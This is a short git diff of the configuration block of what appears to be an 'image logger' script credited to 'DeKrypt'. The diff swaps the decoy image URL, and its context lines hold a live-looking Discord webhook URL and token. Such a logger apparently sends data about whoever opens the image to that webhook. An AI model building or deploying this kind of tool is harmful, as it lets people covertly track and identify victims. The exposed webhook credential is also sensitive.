@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1343664856728993813/jc35HT83zpa3xgHixC1Bh0GXA6rlqzqRZrmqmG4vj44eOGzDC5D8z3wsp4lPA9vj8aPP",
-    "image": "https://praxilabs.com/en/blog/wp-content/uploads/2019/05/the-Most-Important-Physics-Equations-in-History.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://c4.wallpaperflare.com/wallpaper/985/17/286/planet-globe-fireball-stars-wallpaper-preview.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
